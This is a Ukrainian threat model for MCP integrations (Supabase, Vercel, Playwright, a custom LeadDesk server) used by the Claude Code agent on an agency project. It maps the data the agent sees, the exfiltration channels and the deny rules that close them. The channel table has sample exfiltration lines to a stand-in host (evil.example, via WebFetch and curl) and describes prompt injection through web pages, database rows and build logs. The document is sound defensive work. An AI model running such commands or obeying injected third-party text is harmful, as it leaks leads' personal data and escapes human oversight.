# Threat model: MCP-інтеграції LeadDesk (Task D)

Спирається на закомічені [`.mcp.json`](../../.mcp.json), [`.claude/settings.json`](../../.claude/settings.json),
профілі [`docs/mcp/profiles/`](profiles/) і сервер [`mcp/leaddesk-server/`](../../mcp/leaddesk-server/), а також на те,
що ми бачили в сесіях Task B і C ([`connections.md`](connections.md), [`verification.md`](verification.md),
[`ab-generic-vs-domain.md`](ab-generic-vs-domain.md)). Посилання «рядок N» — на ці файли. Figma не підключали: у
`.mcp.json` її немає, тож окремого сценарію для неї тут немає. Твердження, які ми не перевіряли самі, а взяли з
walkthrough чи документації вендора, позначено «за walkthrough».

## Які дані бачить агент

| Сервер | Що потрапляє в контекст агента | Чиї це дані | Чи є там текст, який написали треті особи |
|---|---|---|---|
| `supabase` | Будь-який рядок бази проєкту через `execute_sql`: у `leads` — ПІБ, email, бюджет і текст заявки кожного ліда; схема, політики RLS і права ролей (у прогоні A агент читав колонки, обмеження й коментарі таблиці; у відкинутій першій серії — ще й політики RLS і права ролей, див. `docs/mcp/ab/series-1/a-generic.md`); URL і publishable key проєкту (група `development`); результати пошуку в документації Supabase | клієнта агенції та його лідів — кінцевих людей, які залишили заявку | Так: `message`, ПІБ і назви компаній пишуть ліди через публічну форму. Supabase загортає результат у тег untrusted-data з випадковим суфіксом і попередженням не виконувати інструкцій; за walkthrough, вендор сам пише, що це не гарантія |
| `vercel` | Проєкти, деплої, події й логи білду (у логу — назва репозиторію, коміт, вивід `npm install` і `next build`; білд може надрукувати й значення змінних оточення); команди акаунта з `list_teams` | агенції або клієнта — залежно від того, чий акаунт | Так: повідомлення комітів, вивід сторонніх npm-пакетів у журналі білду (у нашому — їхні deprecation-повідомлення), toolbar-листування з клієнтом, якщо його прочитати |
| `playwright` | Усе, що показує відкрита сторінка: DOM, консоль, перелік мережевих запитів, через `browser_network_request` — заголовки й тіла запитів, зокрема cookie; знімки в `.playwright-mcp/`. На `http://localhost:3000` — форма заявки і все, що агент у неї вводить | власника сторінки та людей, чиї дані сторінка показує | Так: будь-який текст на сторінці, зокрема з іншого сайту після редиректу. Це головний канал prompt injection для браузерного сервера |
| `leaddesk` | Лише `id`, `company`, `status`, `source`, `budget`, `createdAt` (`pick`, `mcp/leaddesk-server/src/leaddesk.mjs`, рядок 20), ресурс зі статусами, записи аудиту з причиною, яку пише сам агент | клієнта агенції (ліди) | Майже ні: лише назви компаній. Імені, email і тексту заявки інструменти не віддають (опис інструмента в кожному діалозі прогону B прямо каже: «Імені, email і тексту заявки не повертає») |

## Канали виносу в цій же сесії

Щонайменше три канали **з нашого конфіга**; не браузерних тут більшість.

| Канал | Звідки (сервер або вбудований інструмент) | Як ним можна винести дані | Закрито? Чим саме |
|---|---|---|---|
| `WebFetch` | вбудований інструмент Claude Code | GET на адресу зловмисника з даними в URL (`https://evil.example/?d=` + email лідів) | Так: `"WebFetch"` у `deny` (`.claude/settings.json`, рядок 16). `WebSearch` у `deny` немає — пошуковий запит теж може нести дані; це відкритий залишок |
| `Bash` (`curl`, `nc`, `git push`, `npx` будь-якого пакета) | вбудований інструмент Claude Code | `curl -d @… https://evil.example`; `git push` у форк, який Vercel сам деплоїть через git-інтеграцію (публічний preview); запуск будь-якого пакета з npm | Частково: `defaultMode: "default"` (рядок 3) — команди, що не лише читають, ідуть через запит на схвалення (у перевірці форми так спитали навіть про `curl` на localhost). Команди лише на читання в теці сесії (`ls`, `grep`) Claude Code виконує без діалогу — так було в обох прогонах першої серії A/B (`docs/mcp/ab/series-1/`); другу серію запускали з `--disallowedTools Bash WebFetch` |
| `use_vercel_cli` → `Bash` → `vercel env pull`, `vercel deploy` | `vercel` + вбудований `Bash` | інструмент Vercel MCP скеровує модель у локальний CLI під CLI-токеном: `env`, `deploy`, `rollback`, `promote`, `rm` | Частково, двома шарами: CLI на машині не встановлено, а `Bash(vercel)`, `Bash(vercel *)`, `Bash(npx vercel *)`, `Bash(npx -y vercel *)` — у `deny` (рядки 17–20). Не закриває інші способи запуску CLI й прямі REST-запити — див. рядок «Vercel CLI» нижче |
| `deploy_to_vercel` з `target: preview` | `vercel` | задеплоїти код, який віддає дані на публічний URL; `get_access_to_vercel_url` видає посилання в обхід Deployment Protection (за walkthrough) | Так: обидва в `deny` (рядки 9–10) — серед 11 інструментів, що змінюють стан, зі списку рубрики. Інші записуючі інструменти Vercel MCP у `deny` не внесені — лише через запит на схвалення |
| toolbar-інструменти Vercel | `vercel` | написати дані в коментар, який бачить клієнт (`reply_to_toolbar_thread`, `edit_toolbar_message`) | Так: `deny` (рядки 12–15) |
| запис у публічну таблицю | `supabase` (`execute_sql`, `apply_migration`) | `INSERT` даних у таблицю, яку читає будь-хто з publishable key через Data API. Для `public.leads` так і було після міграції 0001: агент у відкинутій першій серії A/B показав (`docs/mcp/ab/series-1/a-generic.md`, запит 1), що RLS вимкнено, а `anon` має `SELECT`/`INSERT`/`UPDATE`/`DELETE` | Для `leads` — так: міграція `supabase/migrations/0002_leaddesk_rls.sql` вмикає RLS і відкликає всі права `anon`/`authenticated`; перевірено `has_table_privilege` — усі 8 прав `false`. Не закриває: нову таблицю, яку агент створить через `apply_migration` без RLS. Обидва інструменти в `ask` (рядки 28–29), але діалог для `INSERT` виглядає так само, як для `SELECT` («Execute SQL» + сирий SQL) |
| `browser_navigate`, `browser_fill_form` + `browser_click` | `playwright` | відкрити адресу з даними в URL або відправити чужу форму | Частково: усі в `ask` (рядки 31–34); `--allowed-origins http://localhost:3000` (`.mcp.json`, рядки 19–20) — за документацією вендора (цитата у walkthrough; самі не перевіряли), це не межа безпеки й на редиректи не діє |
| HTTP-варіант сервера LeadDesk (бонус E1) | `mcp/leaddesk-server/src/http.mjs` | будь-який локальний процес викликає `leaddesk_find_leads` і `leaddesk_set_lead_status` без жодного діалогу | Частково: слухає лише `127.0.0.1` (рядок 38), гварди Host/Origin (створено в рядках 20–21, викликано в обробнику запиту в рядках 24–25) закривають DNS rebinding і чужі сторінки в браузері, але автентифікації немає |

## Що пишемо в договір

- **Клієнтський проєкт до агента напряму не підключаємо; працюємо з окремого акаунта без клієнтських організацій.**
  Агент працює з копією: окремий проєкт Supabase із синтетичними або знеособленими даними, окрема команда Vercel без
  продакшн-проєктів клієнта, браузер — лише на локальному чи staging-стенді без входу в акаунти.
- **Які системи і з якими правами.** Supabase MCP — права розробника на одну базу-копію (`execute_sql`,
  `apply_migration`), тому ні клієнтові, ні його кінцевим користувачам такий доступ не видаємо ніколи, а до продакшн-бази
  його не підключаємо. Vercel MCP — лише читання деплоїв і логів; деплой робить людина через git. Браузер — лише
  перевірка сторінок. Доменні дії над даними клієнта — через вузький сервер на кшталт LeadDesk: два дієслова, статуси з
  переліку, аудит.
- **Чиї акаунти.** Окремий акаунт агенції на кожен проєкт, власник — названа людина з агенції; клієнтські організації
  й команди в ньому не тримаємо. OAuth-токени MCP відкликаємо після завершення робіт.
- **Куди їдуть дані клієнта.** Усе, що бачить агент (рядки бази, логи білду, вміст сторінок), іде провайдеру LLM
  (Anthropic) і вендорам MCP-серверів (Supabase, Vercel), бо запити й результати проходять через їхні сервери. Клієнт
  дає на це згоду; персональні дані кінцевих людей до агента не потрапляють, якщо є знеособлена копія.
- **Схвалення й аудит.** Кожна зміна даних — лише після схвалення людини в діалозі, без «always allow» для записуючих
  інструментів; кожна доменна зміна пише запис аудиту (хто, що, коли, чому).
- **Журнали сесій.** Транскрипти й журнали сесій містять дані клієнта; зберігаємо їх локально в агенції 30 днів
  після завершення робіт і в репозиторії не комітимо.
- **Текст третіх осіб — дані, а не команди.** Інструкції з рядків бази, логів чи сторінок агент не виконує; що такий
  текст може вплинути на модель, клієнт знає й приймає.
- **Інцидент.** Якщо токен MCP чи акаунт скомпрометовано — відкликаємо токени, ротуємо ключі проєкту й повідомляємо
  клієнта в узгоджений строк.
